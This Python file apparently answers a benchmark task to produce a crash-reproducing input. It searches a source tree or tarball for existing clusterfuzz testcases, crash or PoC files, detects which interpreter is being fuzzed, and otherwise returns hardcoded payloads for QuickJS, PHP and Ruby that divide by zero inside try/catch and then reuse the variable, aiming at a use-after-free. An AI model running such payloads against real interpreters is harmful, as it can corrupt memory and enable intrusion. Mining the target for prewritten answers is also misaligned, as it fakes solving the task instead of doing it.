import os
import re
import tarfile
from typing import Iterable, Iterator, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        kw_name = (
            "clusterfuzz-testcase",
            "clusterfuzz",
            "testcase",
            "crash",
            "poc",
            "repro",
            "uaf",
            "use-after-free",
            "use_after_free",
            "div0",
            "divby0",
            "divide-by-zero",
            "division-by-zero",
            "division_by_zero",
            "35876",
        )

        wanted_ext = {
            ".c", ".h", ".cc", ".cpp", ".cxx", ".hh",
            ".js", ".mjs", ".ts",
            ".php", ".rb", ".py", ".pl",
            ".txt", ".md", ".rst",
            ".json", ".yaml", ".yml",
        }

        def is_text_blob(b: bytes) -> bool:
            if not b:
                return True
            if b"\x00" in b:
                return False
            # Accept mostly ASCII/UTF-8-like blobs quickly
            bad = 0
            for ch in b[:2048]:
                if ch in (9, 10, 13) or 32 <= ch <= 126:
                    continue
                if ch >= 128:
                    continue
                bad += 1
                if bad > 8:
                    return False
            return True

        def decode_text(b: bytes) -> str:
            try:
                return b.decode("utf-8", "ignore")
            except Exception:
                return b.decode("latin-1", "ignore")

        def iter_files_from_dir(root: str) -> Iterator[Tuple[str, bytes]]:
            max_files = 6000
            max_total = 64 * 1024 * 1024
            total = 0
            count = 0
            for base, _, files in os.walk(root):
                for fn in files:
                    if count >= max_files or total >= max_total:
                        return
                    path = os.path.join(base, fn)
                    try:
                        st = os.stat(path)
                    except OSError:
                        continue
                    if not os.path.isfile(path):
                        continue
                    size = st.st_size
                    rel = os.path.relpath(path, root).replace("\\", "/")
                    low = rel.lower()
                    ext = os.path.splitext(low)[1]
                    must_read = any(k in low for k in kw_name) or ext in wanted_ext
                    if not must_read:
                        continue
                    if size > 2 * 1024 * 1024:
                        continue
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    total += len(data)
                    count += 1
                    yield rel, data

        def iter_files_from_tar(tar_path: str) -> Iterator[Tuple[str, bytes]]:
            max_files = 8000
            max_total = 96 * 1024 * 1024
            total = 0
            count = 0
            try:
                tf = tarfile.open(tar_path, "r:*")
            except Exception:
                return
            with tf:
                for m in tf:
                    if count >= max_files or total >= max_total:
                        return
                    if not m.isreg():
                        continue
                    name = (m.name or "").lstrip("./")
                    low = name.lower()
                    ext = os.path.splitext(low)[1]
                    must_read = any(k in low for k in kw_name) or ext in wanted_ext
                    if not must_read:
                        continue
                    if m.size > 2 * 1024 * 1024:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    total += len(data)
                    count += 1
                    yield name, data

        def iter_files(path: str) -> Iterator[Tuple[str, bytes]]:
            if os.path.isdir(path):
                yield from iter_files_from_dir(path)
            else:
                yield from iter_files_from_tar(path)

        def name_priority(fname: str) -> int:
            low = fname.lower()
            p = 0
            if "clusterfuzz-testcase" in low:
                p += 100
            if "crash" in low:
                p += 40
            if "poc" in low:
                p += 35
            if "repro" in low:
                p += 30
            if "uaf" in low or "use-after-free" in low or "use_after_free" in low:
                p += 25
            if "div" in low and "0" in low:
                p += 15
            if "35876" in low:
                p += 20
            return p

        def content_score(text: str) -> int:
            t = text
            s = 0
            if "/=" in t:
                s += 5
            if "0n" in t:
                s += 9
            if "catch" in t:
                s += 3
            if "try" in t:
                s += 2
            if "bigint" in t.lower():
                s += 4
            if "division" in t.lower() and "zero" in t.lower():
                s += 4
            if "zerodivision" in t.lower():
                s += 4
            if "rangeerror" in t.lower():
                s += 2
            if "throw" in t.lower():
                s += 1
            if "use after free" in t.lower():
                s += 10
            return s

        # Detection + mining
        engine = None  # "quickjs", "php", "mruby", "ruby", "python", "unknown"
        php_needs_tags: Optional[bool] = None

        best_named: Optional[Tuple[int, int, str, bytes]] = None  # (-prio, len, name, data)
        best_text: Optional[Tuple[int, int, str, bytes]] = None   # (-score, len, name, data)

        # Try to find explicit PoC/testcase first; also detect engine from harness
        for name, data in iter_files(src_path):
            low = name.lower()

            pr = name_priority(name)
            if pr > 0 and len(data) <= 4096:
                key = (-pr, len(data), name, data)
                if best_named is None or key < best_named:
                    best_named = key

            # lightweight engine detection
            if engine is None:
                if low.endswith("quickjs.c") or low.endswith("quickjs.h") or b"JS_Eval" in data or b"quickjs" in data[:4096].lower():
                    engine = "quickjs"
                elif b"zend_eval_stringl" in data or b"php_execute_script" in data or b"zend_compile_string" in data or b"Zend Engine" in data:
                    engine = "php"
                elif b"mrb_load" in data or b"mruby" in data[:4096].lower():
                    engine = "mruby"
                elif b"ruby_init" in data or b"libruby" in data[:4096].lower():
                    engine = "ruby"
                elif b"Py_Initialize" in data or b"python" in data[:4096].lower():
                    engine = "python"

            if php_needs_tags is None and b"LLVMFuzzerTestOneInput" in data:
                dlow = data.lower()
                if b"zend_eval_stringl" in dlow or b"zend_eval_string" in dlow or b"zend_compile_string" in dlow:
                    php_needs_tags = False
                elif b"php_execute_script" in dlow or b"zend_execute_scripts" in dlow:
                    php_needs_tags = True

            # content-based candidate
            if len(data) <= 8192 and is_text_blob(data):
                text = decode_text(data)
                sc = content_score(text)
                if sc > 0:
                    key = (-sc, len(data), name, data)
                    if best_text is None or key < best_text:
                        best_text = key

        if best_named is not None:
            return best_named[3]
        if best_text is not None and (-best_text[0]) >= 10:
            return best_text[3]

        # Fallback PoCs by detected engine
        if engine == "php":
            if php_needs_tags is None:
                php_needs_tags = True
            core = '$a="A";try{$a/=0;}catch(Throwable $e){}echo $a;'
            if php_needs_tags:
                return ("<?php " + core + " ?>").encode("ascii")
            else:
                return core.encode("ascii")

        if engine in ("ruby", "mruby"):
            return b'a=1;begin;a/=0;rescue;end;a.to_s'

        if engine == "python":
            return b'a=1\ntry:\n a/=0\nexcept Exception:\n pass\n'

        # Default: assume JS (QuickJS / similar). BigInt division by 0 throws; try/catch to continue; then use a.
        return b'a=2n**2000n;try{a/=0n}catch(e){}a.toString()'